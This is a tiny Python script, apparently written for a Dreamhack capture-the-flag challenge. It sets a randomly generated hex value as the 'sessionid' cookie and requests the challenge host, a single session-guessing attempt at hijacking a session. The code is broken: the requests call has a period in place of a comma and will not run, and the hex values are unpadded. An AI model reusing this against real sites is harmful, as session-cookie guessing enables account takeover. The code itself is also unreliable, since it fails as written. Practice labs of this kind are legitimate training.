import requests
from random import randint

 
rand_hex_str = hex(randint(0, 255))
print(rand_hex_str)

cookies = {'sessionid' : (rand_hex_str)  }
requests.get('http://host1.dreamhack.games:24499'. cookies = cookies)


